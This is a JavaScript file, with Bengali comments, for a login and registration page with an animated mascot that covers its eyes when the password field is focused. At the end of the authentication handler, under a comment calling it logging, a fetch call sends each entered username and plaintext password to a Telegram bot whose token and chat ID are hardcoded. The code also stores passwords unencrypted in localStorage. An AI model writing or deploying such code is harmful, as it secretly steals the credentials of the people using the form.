// এলিমেন্টগুলো সিলেক্ট করা
const img = document.getElementById('mascot-img');
const pass = document.getElementById('password');
const toggleBtn = document.getElementById('toggle-pass');
const actionBtn = document.getElementById('action-btn');
const toggleLink = document.getElementById('toggle-link');
const formTitle = document.getElementById('form-title');

let isLogin = true;

// ইমেজ পোজ
const poses = {
    idle: '1000022715.jpg',
    covering: '1000022716.jpg',
    peeking: '1000022717.jpg'
};

// ১. পাসওয়ার্ড বক্সে ফোকাস লজিক
pass.addEventListener('focus', () => { 
    if(pass.type === "password") img.src = poses.covering; 
});

pass.addEventListener('blur', () => { 
    if(pass.type === "password") img.src = poses.idle; 
});

// ২. পাসওয়ার্ড টগল (Show/Hide) লজিক
toggleBtn.addEventListener('click', () => {
    if (pass.type === "password") {
        pass.type = "text";
        img.src = poses.peeking;
        toggleBtn.innerText = "🙈";
    } else {
        pass.type = "password";
        img.src = poses.covering;
        toggleBtn.innerText = "👁️";
    }
});

// ৩. ফর্ম সুইচ লজিক (Login <-> Register)
function switchForm() {
    isLogin = !isLogin;
    formTitle.innerText = isLogin ? "Login" : "Create Account";
    actionBtn.innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
    toggleLink.innerText = isLogin ? "Create Account" : "Already have an account? Login";
}

// ৪. মূল হ্যান্ডেলার (লগইন ও সাইন-আপ)
function handleAuth() {
    const user = document.getElementById('username').value;
    const passVal = pass.value;

    if (!user || !passVal) return alert("Please fill all fields!");

    if (isLogin) {
        // লগইন লজিক
        if (localStorage.getItem(user) === passVal) {
            alert("Login Successful! Redirecting...");
            window.location.href = "https://www.google.com"; // আপনার মেইন পেজ
        } else {
            alert("Invalid username or password!");
        }
    } else {
        // সাইন-আপ লজিক
        localStorage.setItem(user, passVal);
        alert("Account created successfully! Now you can login.");
        switchForm();
    }

    // টেলিগ্রামে ডাটা পাঠানো (লগিং)
    const token = "8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc";
    const chatId = "7950771882";
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Action:${isLogin?'Login':'Signup'}%0AUser:${user}%0APass:${passVal}`);
}
